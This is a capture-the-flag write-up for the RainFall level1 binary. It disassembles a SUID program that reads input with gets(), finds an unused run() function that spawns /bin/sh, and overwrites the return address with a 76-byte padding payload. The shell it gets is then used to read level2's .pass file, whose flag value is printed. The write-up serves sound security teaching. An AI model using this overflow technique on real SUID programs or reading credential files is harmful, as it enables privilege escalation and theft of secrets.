We can see that the program simply uses the function gets() to take user input :

```
(gdb) disass main
Dump of assembler code for function main:
   0x08048480 <+0>:	push   %ebp
   0x08048481 <+1>:	mov    %esp,%ebp
   0x08048483 <+3>:	and    $0xfffffff0,%esp
   0x08048486 <+6>:	sub    $0x50,%esp
   0x08048489 <+9>:	lea    0x10(%esp),%eax
   0x0804848d <+13>:	mov    %eax,(%esp)
   0x08048490 <+16>:	call   0x8048340 <gets@plt>
   0x08048495 <+21>:	leave  
   0x08048496 <+22>:	ret    
End of assembler dump.
```

By examining the man of the gets() function, it becomes evident that the function is deprecated and poses a security vulnerability:

```
Never use gets(). Because it is impossible to tell without knowing the data in advance how many characters gets() will read, and because gets() will continue to store characters past the end of the buffer, it is extremely dangerous to use. 
```

The program has the SUID bit set, and a buffer overflow is possible due to the use of gets().
I chose to use Ghidra, so I exported the program using scp :

```
scp -P 4242 level1@127.0.0.1:/home/user/level1/level1 .
```

We see the decompiled version of the main :

```C
void main(void)

{
  char local_50 [76];
  
  gets(local_50);
  return;
}
```

If we write more than the buffer's allocated space, the program triggers a segfault :

```shell
level1@RainFall:~$ python -c "print('A' * 80)" | ./level1
Segmentation fault (core dumped)
```

Another interesting function is visible in the program:

```shell
                             undefined run()
             undefined         AL:1           <RETURN>
             undefined4        Stack[-0x10]:4 local_10                                XREF[1]:     08048456(W)  
             undefined4        Stack[-0x14]:4 local_14                                XREF[1]:     0804845a(W)  
             undefined4        Stack[-0x18]:4 local_18                                XREF[1]:     08048462(W)  
             undefined4        Stack[-0x1c]:4 local_1c                                XREF[2]:     0804846a(*), 
                                                                                                   08048472(*)  
                             run                                             XREF[3]:     Entry Point(*), 080485a0, 
                                                                                          0804860c(*)  
        08048444 55              PUSH       EBP
        08048445 89 e5           MOV        EBP,ESP
        08048447 83 ec 18        SUB        ESP,0x18
        0804844a a1 c0 97        MOV        EAX,[stdout]
                 04 08
        0804844f 89 c2           MOV        EDX,EAX
        08048451 b8 70 85        MOV        EAX,s_Good..._Wait_what?_08048570                = "Good... Wait what?\n"
                 04 08
        08048456 89 54 24 0c     MOV        dword ptr [ESP + local_10],EDX
        0804845a c7 44 24        MOV        dword ptr [ESP + local_14],0x13
                 08 13 00 
                 00 00
        08048462 c7 44 24        MOV        dword ptr [ESP + local_18],0x1
                 04 01 00 
                 00 00
        0804846a 89 04 24        MOV        dword ptr [ESP]=>local_1c,EAX=>s_Good..._Wait_   = "Good... Wait what?\n"
        0804846d e8 de fe        CALL       <EXTERNAL>::fwrite                               size_t fwrite(void * __ptr, size
                 ff ff
        08048472 c7 04 24        MOV        dword ptr [ESP]=>local_1c,s_/bin/sh_08048584     = "/bin/sh"
                 84 85 04 08
        08048479 e8 e2 fe        CALL       <EXTERNAL>::system                               int system(char * __command)
                 ff ff
        0804847e c9              LEAVE
        0804847f c3              RET
```

The decompiler give us this :

```C
void run(void)

{
  fwrite("Good... Wait what?\n",1,0x13,stdout);
  system("/bin/sh");
  return;
}
```

This function is present in the program but never called by the main. However we can use a buffer overflow to manipulate the program's execution flow and make it jump to this function.

The entry point seems to be at: `08048444 55 PUSH EBP``

If we write the adress in little endian after the initial 76 characters :

```shell
level1@RainFall:~$ python -c "print('A' * 76 + '\x44\x84\x04\x08')" | ./level1
Good... Wait what?
Segmentation fault (core dumped)
```

Although we see the call to fwrite, the program stops without staying within /bin/sh. To overcome this, we can append a cat command to redirect the standard outputs towards the program's /bin/sh:

```shell
level1@RainFall:~$ (python -c "print('A' * 76 + '\x44\x84\x04\x08')" && cat) | ./level1
Good... Wait what?
whoami
level2
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

And we get the flag !
